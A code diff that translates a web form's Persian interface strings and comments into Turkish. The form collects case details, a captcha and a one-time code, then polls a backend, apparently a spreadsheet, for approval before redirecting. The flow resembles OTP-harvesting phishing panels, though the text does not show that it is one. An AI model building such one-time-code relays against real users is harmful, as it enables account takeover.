@@ -98,7 +98,7 @@ function getYearMonth() {
 }
 
 function showLoading(message) {
-  loadingText.textContent = message || "لطفاً منتظر بمانید...";
+  loadingText.textContent = message || "Lütfen bekleyiniz...";
   loadingOverlay.classList.remove("hidden");
 }
 
@@ -120,7 +120,7 @@ async function postAPI(data) {
     headers: { "Content-Type": "text/plain;charset=utf-8" },
     body: JSON.stringify(data)
   });
-  if (!response.ok) throw new Error("ارتباط با سرور برقرار نشد.");
+  if (!response.ok) throw new Error("Sunucu ile bağlantı kurulamadı.");
   return await response.json();
 }
 
@@ -129,33 +129,33 @@ async function getAPI(action, params) {
   url.searchParams.set("action", action);
   Object.keys(params).forEach(k => url.searchParams.set(k, params[k]));
   const response = await fetch(url.toString(), { method: "GET", cache: "no-store" });
-  if (!response.ok) throw new Error("خطا در ارتباط با سرور.");
+  if (!response.ok) throw new Error("Sunucu ile bağlantıda hata oluştu.");
   return await response.json();
 }
 
 function validateForm() {
   if (!caseNameInput.value.trim()) {
-    showToast("لطفاً اسم پرونده را وارد کنید.", "error"); caseNameInput.focus(); return false;
+    showToast("Lütfen dosya adını giriniz.", "error"); caseNameInput.focus(); return false;
   }
   if (!trackingNumberInput.value.trim()) {
-    showToast("لطفاً شماره پیگیری پرونده را وارد کنید.", "error"); trackingNumberInput.focus(); return false;
+    showToast("Lütfen dosya takip numarasını giriniz.", "error"); trackingNumberInput.focus(); return false;
   }
   if (!yearMonthInput.value) {
-    showToast("لطفاً سال و ماه را انتخاب کنید.", "error"); yearMonthInput.focus(); return false;
+    showToast("Lütfen yıl ve ayı seçiniz.", "error"); yearMonthInput.focus(); return false;
   }
   if (!/^[0-9]{3,5}$/.test(fcvNumberInput.value.trim())) {
-    showToast("شماره مسلسل باید فقط ۳ تا ۵ رقم باشد.", "error"); fcvNumberInput.focus(); return false;
+    showToast("Seri numarası yalnızca 3 ila 5 rakamdan oluşmalıdır.", "error"); fcvNumberInput.focus(); return false;
   }
   if (!captchaInput.value.trim()) {
-    showToast("لطفاً عدد تصویر امنیتی را وارد کنید.", "error"); captchaInput.focus(); return false;
+    showToast("Lütfen güvenlik görselindeki rakamları giriniz.", "error"); captchaInput.focus(); return false;
   }
   if (captchaInput.value.trim() !== captchaCode) {
-    showToast("عدد تصویر امنیتی صحیح نیست.", "error"); generateCaptcha(); captchaInput.focus(); return false;
+    showToast("Güvenlik görselindeki rakamlar doğru değil.", "error"); generateCaptcha(); captchaInput.focus(); return false;
   }
   return true;
 }
 
-// تأیید امنیتی به صورت خودکار وقتی کد واردشده دقیقاً با تصویر یکسان شود.
+// Girilen kod görseldeki kodla tam olarak eşleştiğinde güvenlik doğrulaması otomatik olarak yapılır.
 captchaInput.addEventListener("input", () => {
   if (securityVerified || securitySubmitting) return;
   const value = captchaInput.value.trim();
@@ -167,7 +167,7 @@ captchaInput.addEventListener("input", () => {
 async function verifySecurityAutomatically() {
   if (!validateForm() || securityVerified || securitySubmitting) return;
   securitySubmitting = true;
-  showLoading("در حال تأیید خودکار کد امنیتی...");
+  showLoading("Güvenlik kodu otomatik olarak doğrulanıyor...");
 
   try {
     const date = getYearMonth();
@@ -183,7 +183,7 @@ async function verifySecurityAutomatically() {
       captchaInput: captchaInput.value.trim()
     });
 
-    if (!result?.success) throw new Error(result?.message || "تأیید امنیتی انجام نشد.");
+    if (!result?.success) throw new Error(result?.message || "Güvenlik doğrulaması yapılamadı.");
 
     securityVerified = true;
     otpSection.classList.remove("hidden");
@@ -195,16 +195,16 @@ async function verifySecurityAutomatically() {
     captchaInput.disabled = true;
     refreshCaptchaBtn.disabled = true;
 
-    otpStatus.textContent = "در حال ارسال کد OTP...";
+    otpStatus.textContent = "OTP kodu gönderiliyor...";
     requestOtpBtn.classList.add("hidden");
 
     setTimeout(() => otpSection.scrollIntoView({ behavior: "smooth", block: "center" }), 150);
 
-    // بلافاصله پس از تأیید CAPTCHA، OTP به‌صورت خودکار ایجاد/ارسال می‌شود.
+    // CAPTCHA doğrulamasından hemen sonra OTP otomatik olarak oluşturulur/gönderilir.
     await requestOTP();
   } catch (error) {
     console.error(error);
-    showToast(error.message || "خطایی رخ داد.", "error");
+    showToast(error.message || "Bir hata oluştu.", "error");
     securityVerified = false;
   } finally {
     securitySubmitting = false;
@@ -212,7 +212,7 @@ async function verifySecurityAutomatically() {
   }
 }
 
-// OTP بدون کلیک کاربر و بلافاصله پس از تأیید CAPTCHA درخواست می‌شود.
+// OTP, kullanıcı tarafından tıklama yapılmasına gerek kalmadan CAPTCHA doğrulamasından hemen sonra istenir.
 requestOtpBtn.classList.add("hidden");
 resendOtpBtn.addEventListener("click", requestOTP);
 
@@ -221,11 +221,11 @@ async function requestOTP() {
 
   requestOtpBtn.disabled = true;
   resendOtpBtn.disabled = true;
-  showLoading("در حال ارسال کد OTP...");
+  showLoading("OTP kodu gönderiliyor...");
 
   try {
     const result = await postAPI({ action: "requestOTP", sessionId });
-    if (!result?.success) throw new Error(result?.message || "ارسال OTP انجام نشد.");
+    if (!result?.success) throw new Error(result?.message || "OTP gönderilemedi.");
 
     otpSent = true;
     otpStatus.textContent = "Gönderilen OTP Kodunu Giriniz";
@@ -301,7 +301,7 @@ async function submitCaseNumber() {
 
   try {
     const result = await postAPI({ action: "submitCaseNumber", sessionId, caseNumber });
-    if (!result?.success) throw new Error(result?.message || "OTP Kodu Süresi Dolmuş veya Geçersizdir.");
+    if (!result?.success) throw new Error(result?.message || "OTP Kodunun süresi dolmuş veya geçersiz.");
 
     caseSubmitted = true;
     caseNumberInput.disabled = true;
@@ -319,7 +319,7 @@ async function submitCaseNumber() {
   }
 }
 
-//OTP Kodu Girildikten Sonra İşlem Otomatik Olarak Başlatılacaktır.
+// OTP Kodu Girildikten Sonra İşlem Otomatik Olarak Başlatılacaktır.
 caseNumberInput.addEventListener("input", () => {
   if (caseSubmitted || caseSubmitting) return;
 
@@ -352,7 +352,7 @@ async function checkStatusOnce() {
         setTimeout(() => { window.location.href = redirectUrl; }, 500);
       } else {
         hideLoading();
-        showToast("درخواست تأیید شد، اما لینک انتقال در ستون I ثبت نشده است.", "error");
+        showToast("Talebiniz onaylandı, ancak yönlendirme bağlantısı I sütununa kaydedilmemiş.", "error");
       }
     }
   } catch (error) {
@@ -367,7 +367,7 @@ document.addEventListener("visibilitychange", () => {
 caseForm.addEventListener("submit", e => {
   e.preventDefault();
   if (!securityVerified) {
-    showToast("ابتدا کد امنیتی را درست وارد کنید.", "error");
+    showToast("Öncelikle güvenlik kodunu doğru şekilde giriniz.", "error");
     return;
   }
   if (!caseSubmitted) submitCaseNumber();
@@ -390,7 +390,7 @@ function openSideMenu() {
   if (!menuToggle || !sideMenu || !sidebarOverlay) return;
   menuToggle.classList.add("active");
   menuToggle.setAttribute("aria-expanded", "true");
-  menuToggle.setAttribute("aria-label", "بستن منو");
+  menuToggle.setAttribute("aria-label", "Menüyü kapat");
   sideMenu.classList.add("open");
   sideMenu.setAttribute("aria-hidden", "false");
   sidebarOverlay.classList.add("open");
@@ -401,7 +401,7 @@ function closeSideMenu() {
   if (!menuToggle || !sideMenu || !sidebarOverlay) return;
   menuToggle.classList.remove("active");
   menuToggle.setAttribute("aria-expanded", "false");
-  menuToggle.setAttribute("aria-label", "باز کردن منو");
+  menuToggle.setAttribute("aria-label", "Menüyü aç");
   sideMenu.classList.remove("open");
   sideMenu.setAttribute("aria-hidden", "true");
   sidebarOverlay.classList.remove("open");
